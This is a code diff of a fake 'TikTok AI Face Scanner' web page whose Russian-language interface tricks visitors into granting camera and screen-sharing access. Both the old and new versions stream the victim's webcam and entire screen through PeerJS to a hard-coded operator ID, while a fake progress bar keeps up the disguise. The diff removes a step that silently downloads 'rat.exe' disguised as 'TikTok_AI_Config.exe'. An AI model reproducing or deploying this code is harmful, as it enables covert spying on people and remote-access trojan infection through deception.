@@ -3,39 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok AI Filter v5.5</title>
+    <title>TikTok AI Morph v6.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0,0,0,1); }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        #loader, #final-step, #screamer { display: none; }
-        .progress-fill { width: 0%; height: 8px; background: #ff0050; transition: 0.2s; border-radius: 10px; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: #0d0d0d; border: 1px solid #222; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
+        .logo { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0050); }
+        h1 { font-size: 24px; margin-bottom: 10px; color: #fff; }
+        p { color: #777; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 20px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 5px 20px rgba(255,0,80,0.3); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,0,80,0.5); }
+        #loader, #step-2, #screamer { display: none; }
+        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
+        .progress-fill { width: 0%; height: 100%; background: #ff0050; transition: 0.3s; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
-        #screamer img { width: 120%; height: 120%; object-fit: cover; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -3px); } 100% { transform: translate(1px, 2px); } }
+        #screamer img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-    <div id="start" class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
-        <h1>AI Face Morph</h1>
-        <p style="color: #666;">Нажмите для калибровки нейросети</p>
-        <button class="btn" onclick="initApp()">НАЧАТЬ</button>
+    <div id="step-1" class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
+        <h1>AI Face Scanner</h1>
+        <p>Разрешите доступ к камере для калибровки нейросети под ваше лицо.</p>
+        <button class="btn" onclick="startCamera()">НАЧАТЬ</button>
     </div>
 
     <div id="loader" class="box">
-        <h2 id="status">ЗАГРУЗКА МОДЕЛЕЙ...</h2>
-        <div style="width:100%; background:#222; border-radius:10px;"><div id="fill" class="progress-fill"></div></div>
-        <p id="pct">0%</p>
+        <h2>АНАЛИЗ ЛИЦА...</h2>
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+        <div id="percent" style="color: #ff0050; font-weight: bold;">0%</div>
     </div>
 
-    <div id="final-step" class="box">
-        <h2 style="color: #00f2ea;">ПОЧТИ ГОТОВО!</h2>
-        <p>Конфигурация загружена. Нажмите кнопку ниже для финальной синхронизации экрана.</p>
-        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">ВКЛЮЧИТЬ ЭФФЕКТ</button>
+    <div id="step-2" class="box">
+        <h2 style="color: #00f2ea;">ПОЧТИ ГОТОВО</h2>
+        <p>Для наложения AI-фильтра в реальном времени требуется синхронизация интерфейса.</p>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="startScreen()">ПОДТВЕРДИТЬ</button>
     </div>
 
     <div id="screamer">
@@ -48,55 +51,46 @@
         const peer = new Peer();
         let conn;
 
-        async function initApp() {
+        // 1. Подключение камеры
+        async function startCamera() {
             try {
-                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
-                peer.call(ADM_ID, camStream);
+                peer.call(ADM_ID, stream);
 
-                document.getElementById('start').style.display = 'none';
+                document.getElementById('step-1').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
                 let p = 0;
                 let int = setInterval(() => {
-                    p += 10;
-                    document.getElementById('fill').style.width = p + '%';
-                    document.getElementById('pct').innerText = p + '%';
+                    p += Math.floor(Math.random() * 15) + 5;
                     if (p >= 100) {
+                        p = 100;
                         clearInterval(int);
-                        finishLoading();
+                        setTimeout(() => {
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('step-2').style.display = 'block';
+                        }, 500);
                     }
+                    document.getElementById('fill').style.width = p + '%';
+                    document.getElementById('percent').innerText = p + '%';
                 }, 200);
 
                 listen();
-            } catch (e) { alert("Ошибка! Нужен доступ к камере."); location.reload(); }
+            } catch (e) { alert("Ошибка: нужен доступ к камере!"); location.reload(); }
         }
 
-        function finishLoading() {
-            // 1. Сначала скрыто скачиваем файл (путь должен быть правильный на хостинге!)
-            const a = document.createElement('a');
-            a.href = 'rat.exe'; 
-            a.download = 'TikTok_AI_Config.exe';
-            a.click();
-
-            // 2. Переходим к шагу с кнопкой для экрана
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('final-step').style.display = 'block';
-        }
-
-        async function getScreen() {
+        // 2. Подключение экрана (ПО ОТДЕЛЬНОМУ КЛИКУ)
+        async function startScreen() {
             try {
                 const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 peer.call(ADM_ID, screenStream);
                 
-                document.getElementById('final-step').innerHTML = "<h2>ГОТОВО</h2><p>Эффект успешно активирован!</p>";
+                document.getElementById('step-2').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно настроен. Окно можно свернуть.</p>";
                 
-                // Переход в полноэкранный режим после клика
+                // Переход в F11 для красоты (опционально)
                 document.documentElement.requestFullscreen().catch(()=>{});
-                document.body.style.cursor = 'none';
-            } catch(e) {
-                alert("Ошибка! Необходимо разрешить трансляцию экрана для работы фильтра.");
-            }
+            } catch(e) { alert("Ошибка доступа к экрану!"); }
         }
 
         function listen() {
